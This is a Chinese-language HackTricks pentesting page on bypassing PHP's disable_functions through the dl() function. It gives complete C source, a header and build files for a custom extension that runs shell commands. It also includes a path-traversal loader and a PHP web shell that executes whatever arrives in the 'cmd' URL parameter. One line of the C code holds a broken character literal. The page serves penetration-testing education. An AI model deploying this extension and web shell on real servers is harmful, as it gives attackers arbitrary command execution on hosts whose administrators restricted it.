<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>

**重要提示：**

![image](https://user-images.githubusercontent.com/84577967/174675487-a4c4ca06-194f-4725-85af-231a2f35d56c.png)

**`dl`** 是一个PHP函数，用于加载PHP扩展。如果该函数未被禁用，它可以被滥用以**绕过`disable_functions`并执行任意命令**。\
然而，它有一些严格的限制：

* `dl`函数必须在环境中**存在**且**未被禁用**
* PHP扩展必须使用与服务器相同的**主要版本**（PHP API版本）进行编译（您可以在phpinfo的输出中查看此信息）
* PHP扩展必须位于由**`extension_dir`**指令定义的**目录**中（您可以在phpinfo的输出中看到它）。攻击者很难获得对此目录的写访问权限，因此这个要求可能会阻止您滥用这种技术）。

**如果您满足这些要求，请继续阅读从**[**https://antichat.com/threads/70763/**](https://antichat.com/threads/70763/) **复制的帖子，了解如何绕过`disable_functions`**

当管理员配置服务器时，他/她忽略了[dl函数](http://www.php.net/manual/en/function.dl.php)，并没有禁用它，因为没有提到可以执行系统命令的功能。\
[dl函数](http://www.php.net/manual/en/function.dl.php)用于在执行脚本时加载PHP扩展。\
\
（PHP扩展是用C/C++编写的，用于为PHP提供更多功能。）\
\
攻击者注意到该函数未被禁用，并看到了潜力，决定创建一个PHP扩展。\
攻击者使用一个小脚本`<?php echo 'PHP版本为'.PHP_VERSION; ?>`（PHP\_VERSION是一个预定义常量，包含PHP的版本号）来检查PHP的版本。\
\
攻击者记录下版本号，并从[PHP网站](http://www.php.net/downloads.php)下载tarball，在这种情况下，版本较旧，所以攻击者必须转到[存档](http://museum.php.net)。\
\
然后，他在自己的机器上解压源代码并[编译和安装](http://www.php.net/manual/en/install.php)PHP的版本。\
\
现在是创建扩展的时候了。\
攻击者从PHP网站上阅读有关[创建PHP扩展](http://www.php.net/manual/en/zend.creating.php)的文档。\
在阅读了文档并创建了一些自己的扩展后，攻击者决定查看PHP代码库，因为他想要的函数已经被创建了。\
\
将被复制的函数是[exec函数](http://www.php.net/manual/en/function.exec.php)，在代码库中，它位于ext/standard/exec.c中。\
\
相关部分被实现到一个新的扩展中。\
\

**注意事项：**

在开始编译代码之前，您应该注意两点：

1- `bypass.c`文件中的`ZEND_MODULE_API_NO`的值必须更改为您正在使用的当前`Zend Extension Build`的值，您可以使用以下命令行获取它：
```bash
php -i | grep "Zend Extension Build" |awk -F"API4" '{print $2}' | awk -F"," '{print $1}'
```
2- 如果在最新的PHP版本（5、7和8）中编译bypass.c文件时遇到任何错误，您可以将PHP_FUNCTION（bypass_exec）更改为以下内容：
```
PHP_FUNCTION(bypass_exec)
{
FILE *in;
char *command;
size_t command_len;
zend_string *ret;
php_stream *stream;

ZEND_PARSE_PARAMETERS_START(1, 1)
Z_PARAM_STRING(command, command_len)
ZEND_PARSE_PARAMETERS_END();

if (!command_len) {
zend_argument_value_error(1, "cannot be empty");
RETURN_THROWS();
}
if (strlen(command) != command_len) {
zend_argument_value_error(1, "must not contain any null bytes");
RETURN_THROWS();
}

#ifdef PHP_WIN32
if ((in=VCWD_POPEN(command, "rt"))==NULL) {
#else
if ((in=VCWD_POPEN(command, "r"))==NULL) {
#endif
php_error_docref(NULL, E_WARNING, "Unable to execute '%s'", command);
RETURN_FALSE;
}

stream = php_stream_fopen_from_pipe(in, "rb");
ret = php_stream_copy_to_mem(stream, PHP_STREAM_COPY_ALL, 0);
php_stream_close(stream);

if (ret && ZSTR_LEN(ret) > 0) {
RETVAL_STR(ret);
}
}
```
以下是用于绕过的单独扩展的文件：

{% code title="bypass.c" %}
```c
/*
+----------------------------------------------------------------------+
| Copyright (c) 1997-2003 The PHP Group                                |
+----------------------------------------------------------------------+
| This source file is subject to version 2.02 of the PHP license,      |
| that is bundled with this package in the file LICENSE, and is        |
| available at through the world-wide-web at                           |
| http://www.php.net/license/2_02.txt.                                 |
| If you did not receive a copy of the PHP license and are unable to   |
| obtain it through the world-wide-web, please send a note to          |
| license@php.net so we can mail you a copy immediately.               |
+----------------------------------------------------------------------+
*/


#ifdef HAVE_CONFIG_H
#include "config.h"
#endif

#include "php.h"
#include "php_bypass.h"

static function_entry bypass_functions[] = {
PHP_FE(bypass_exec, NULL)
{NULL, NULL, NULL}
};

zend_module_entry bypass_module_entry = {
#if ZEND_MODULE_API_NO >= 20010901
STANDARD_MODULE_HEADER,
#endif
PHP_BYPASS_EXTNAME,
bypass_functions,
NULL,
NULL,
NULL,
NULL,
NULL,
#if ZEND_MODULE_API_NO >= 20010901
PHP_BYPASS_VERSION,
#endif
STANDARD_MODULE_PROPERTIES
};

#ifdef COMPILE_DL_BYPASS
ZEND_GET_MODULE(bypass)
#endif


PHP_FUNCTION(bypass_exec){
FILE *in;
int readbytes, total_readbytes=0, allocated_space;
pval **cmd;
char *ret;

if (ZEND_NUM_ARGS()!=1 || zend_get_parameters_ex(1, &cmd)==FAILURE) {
WRONG_PARAM_COUNT;
}

convert_to_string_ex(cmd);
#ifdef PHP_WIN32
if ((in=VCWD_POPEN(Z_STRVAL_PP(cmd), "rt"))==NULL) {
#else
if ((in=VCWD_POPEN(Z_STRVAL_PP(cmd), "r"))==NULL) {
#endif
php_error_docref(NULL TSRMLS_CC, E_WARNING, "Unable to execute '%s'", Z_STRVAL_PP(cmd));
RETURN_FALSE;
}

allocated_space = EXEC_INPUT_BUF;
ret = (char *) emalloc(allocated_space);

while (1) {
readbytes = fread(ret+total_readbytes, 1, EXEC_INPUT_BUF, in);
if (readbytes<=0) {
break;
}

total_readbytes += readbytes;
allocated_space = total_readbytes+EXEC_INPUT_BUF;
ret = (char *) erealloc(ret, allocated_space);
}

pclose(in);

RETVAL_STRINGL(ret, total_readbytes, 0);
Z_STRVAL_P(return_value)[total_readbytes] = '\';
}
```
{% code title="php_bypass.h" %}
```c
#ifndef PHP_BYPASS_H
#define PHP_BYPASS_H 1

#define PHP_BYPASS_VERSION "1.0"
#define PHP_BYPASS_EXTNAME "bypass"

PHP_FUNCTION(bypass_exec);

extern zend_module_entry bypass_module_entry;
#define phpext_bypass_ptr &bypass_module_entry

#endif
```
{% code title="config.m4" %}
```bash
PHP_ARG_ENABLE(bypass, [whether to enable bypass support],[--enable-bypass])

if test "$PHP_BYPASS" = "yes"; then
AC_DEFINE(HAVE_BYPASS, 1, [Whether you have bypass])
PHP_NEW_EXTENSION(bypass, bypass.c, $ext_shared)
fi
```
{% endcode %}

一旦文件创建完成，就可以开始构建PHP扩展了。
```
phpize
./configure
make
```
一旦完成，编译后的扩展将位于名为bypass.so的modules子目录中。\
文件被复制到一个安全的位置，现在执行以下命令来清理新创建的文件。
```
make clean
phpize --clean
```
现在攻击者将新创建的扩展上传到受害主机上。

（注意：PHP的主要版本使用不同的API版本，为了能够在一个主机上编译扩展并将其上传到另一个主机上，API版本必须匹配。这就是为什么最初攻击者的机器上安装了相同的PHP版本。）

为了使用dl函数加载扩展，扩展必须位于由extension_dir指令定义的扩展目录中。

这可能是一个问题，因为攻击者很少有在此目录中具有写权限的情况，但是有一种方法可以解决这个问题。

开发人员在dl函数页面的注释部分讨论了这个问题。

讨论的概念是使用相对路径从定义的扩展目录开始。

例如，如果扩展目录设置为/usr/php/extensions，并且您想要在当前的Web目录/home/example.com/html中加载bypass.so，您可以按照以下步骤进行操作：
```php
<?php
dl('../../../home/example.com/html/bypass.so');
?>
```
这将绕过需要在定义的扩展目录中拥有扩展的要求。

还有一种自动化的方法，这样您就不必为不同的主机更改相对路径，这段代码是由endofyourself \[at] yahoo \[dot] com创建的，并在后来由mag\_2000 \[at] front \[dot] ru进行了改进。

该函数存在一个小问题，在某些主机上，扩展目录被设置为"./"，这个函数没有考虑到如果扩展目录被设置为相对路径的情况，修复这个问题的方法是使用realpath函数。

用于加载扩展并执行绕过禁用函数的系统命令的最终脚本如下所示：
```php
<?php

function dl_local( $extensionFile ) {
if(!(bool)ini_get('enable_dl')
||(bool)ini_get('safe_mode')){
die('Loading extensions is not permitted.');
}

if(!file_exists($extensionFile)){
die('File '.$extensionFile.' does not exist.');
}

if(!is_executable($extensionFile)){
die('File '.$extensionFile.' is not executable. ( chmod +x '.$extensionFile.' )');
}

$currentDir = getcwd().'/';
$currentExtPath = realpath(ini_get('extension_dir'));

$subDirs = preg_match_all("/\//",$currentExtPath ,$matches);
unset($matches);

if(!(bool)$subDirs){
die('Could not determine a valid extension path [extension_dir]');
}

$extPathLastChar=strlen($currentExtPath )-1;

if($extPathLastChar==strrpos($currentExtPath,'/')){
$subDirs--;}$backDirStr = '';

for($i = 1; $i <= $subDirs; $i++){
$backDirStr .='..';
if($i != $subDirs){
$backDirStr .='/';
}
}

$finalExtPath = $backDirStr.$currentDir.$extensionFile;
if(!dl($finalExtPath)){
die();
}


$loadedExtensions = get_loaded_extensions();
$thisExtName = $loadedExtensions[sizeof($loadedExtensions)-1];
return $thisExtName;
}

@ini_set ('display_errors','1');
error_reporting(E_ALL);

dl_local('bypass.so');

if(@$_GET['cmd']){
$output = bypass_exec($_GET['cmd']);
echo '<pre>'.$output.'</pre>';
}
?>
```
现在，攻击者只需调用脚本的URL，并附带一个cmd变量和所需的命令，即可执行命令。
```
http://www.example.com/script.php?cmd=ls
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一家**网络安全公司**工作吗？想要在HackTricks中看到你的**公司广告**吗？或者你想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass)，或者在**Twitter**上**关注**我 [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **通过向[hacktricks仓库](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud仓库](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>
